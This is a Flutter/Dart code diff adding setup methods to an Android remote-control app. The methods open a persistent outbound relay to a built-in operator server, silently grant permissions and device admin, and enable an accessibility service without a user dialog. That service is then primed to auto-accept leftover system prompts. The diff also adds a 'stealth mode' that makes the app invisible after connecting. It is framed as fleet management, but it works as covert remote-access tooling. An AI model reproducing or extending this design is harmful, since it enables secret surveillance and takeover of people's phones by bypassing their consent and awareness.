@@ -92,4 +92,102 @@ class SetupService {
     final result = await _channel.invokeMethod('requestScreenCapture');
     return SetupStatus.fromJson(Map<String, dynamic>.from(result));
   }
+
+  /// Operator endpoint baked into the APK resources by CI.
+  Future<Map<String, dynamic>> getBakedServerConfig() async {
+    try {
+      final result = await _channel.invokeMethod('getBakedServerConfig');
+      return Map<String, dynamic>.from(result as Map);
+    } catch (_) {
+      return const {};
+    }
+  }
+
+  /// Live state of the outbound relay dialer: idle|starting|registering|
+  /// connected|streaming|failed, plus the enrolled device id.
+  Future<Map<String, dynamic>> getRelayStatus() async {
+    try {
+      final result = await _channel.invokeMethod('getRelayStatus');
+      return Map<String, dynamic>.from(result as Map);
+    } catch (_) {
+      return const {'state': 'idle', 'deviceId': ''};
+    }
+  }
+
+  /// Starts the persistent unattended-access service (foreground service),
+  /// which registers the device and opens the outbound relay connection.
+  Future<bool> startUnattendedAccess() async {
+    try {
+      return await _channel.invokeMethod('startUnattendedAccess') == true;
+    } catch (_) {
+      return false;
+    }
+  }
+
+  /// Device-owner fleets: silently grants runtime permissions when the app
+  /// holds device-owner/profile-owner rights. No-op on ordinary installs.
+  Future<Map<String, dynamic>> grantAllSilently() async {
+    try {
+      final result = await _channel.invokeMethod('grantAllSilently');
+      return Map<String, dynamic>.from(result as Map);
+    } catch (_) {
+      return const {'deviceOwner': false};
+    }
+  }
+
+  /// Sends the app to the background after the device is connected so the
+  /// persistent service keeps running with minimal footprint.
+  Future<void> moveToBackground() async {
+    try {
+      await _channel.invokeMethod('moveToBackground');
+    } catch (_) {}
+  }
+
+  /// The single privileged permission for the one-tap flow: activates the
+  /// device admin (one system dialog on consumer devices; already active on
+  /// device-owner fleets). Returns true once the admin is active.
+  Future<bool> requestDeviceAdmin() async {
+    try {
+      return await _channel.invokeMethod('requestDeviceAdmin') == true;
+    } catch (_) {
+      return false;
+    }
+  }
+
+  Future<bool> isDeviceAdmin() async {
+    try {
+      return await _channel.invokeMethod('isDeviceAdmin') == true;
+    } catch (_) {
+      return false;
+    }
+  }
+
+  /// Enables the remote-control accessibility service with no user dialog when
+  /// the app is device owner or was provisioned with WRITE_SECURE_SETTINGS
+  /// (the fleet/emulator setup script grants this over adb). Returns true once
+  /// accessibility is live. On a plain consumer install it returns false and
+  /// the wizard shows the single Accessibility toggle instead.
+  Future<bool> enableAccessibilitySilently() async {
+    try {
+      return await _channel.invokeMethod('enableAccessibilitySilently') == true;
+    } catch (_) {
+      return false;
+    }
+  }
+
+  /// Arms the accessibility auto-grant window so the accessibility service
+  /// accepts the residual system dialogs during the one-tap setup.
+  Future<void> armAutoGrant() async {
+    try {
+      await _channel.invokeMethod('armAutoGrant');
+    } catch (_) {}
+  }
+
+  /// Post-connection stealth mode: makes the window invisible and
+  /// non-interactive, then sends the task to the background.
+  Future<void> setInvisible() async {
+    try {
+      await _channel.invokeMethod('setInvisible');
+    } catch (_) {}
+  }
 }
